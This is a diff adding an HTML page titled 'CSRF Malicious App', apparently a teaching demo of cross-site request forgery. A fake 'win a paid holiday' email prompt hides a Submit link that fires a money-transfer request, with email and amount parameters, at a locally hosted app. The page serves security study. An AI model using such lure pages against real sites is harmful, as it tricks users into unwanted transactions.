@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>CSRF Malicious App</title>
+<style>
+	html, body {
+    height: 100%;
+}
+
+html {
+    display: table;
+    margin: auto;
+}
+
+body {
+    display: table-cell;
+    vertical-align: middle;
+    background-image:
+		url(https://cdn-images-1.medium.com/max/2000/1*wy8ZqNVfQ4TYAMVpen3Gbg.jpeg);
+	background-position: center center;
+	background-repeat: no-repeat;
+	background-attachment: fixed;
+	background-size: cover;
+	background-color: #464646;
+	display: -ms-flexbox;
+	display: -webkit-box;
+	display: flex;
+	-ms-flex-align: center;
+	-ms-flex-pack: center;
+	-webkit-box-align: center;
+	align-items: center;
+	-webkit-box-pack: center;
+	justify-content: center;
+	padding-top: 40px;
+	padding-bottom: 40px;
+	display: -ms-flexbox;
+	display: -ms-flexbox;
+}
+.button {
+    display: block;
+    width: 100px;
+    height: 20px;
+    background: #4E9CAF;
+    padding: 10px;
+    text-align: center;
+    border-radius: 5px;
+    color: white;
+    font-weight: bold;
+}
+</style>
+</head>
+<body background="https://cdn-images-1.medium.com/max/2000/1*wy8ZqNVfQ4TYAMVpen3Gbg.jpeg">
+	
+		Enter your e-mail to win a paid holiday <input type="text">
+		<a class="button" href="http://localhost:8080/send?email=test%40yahoo.com&money=22">Submit</a>
+	
+</body>
+</html>
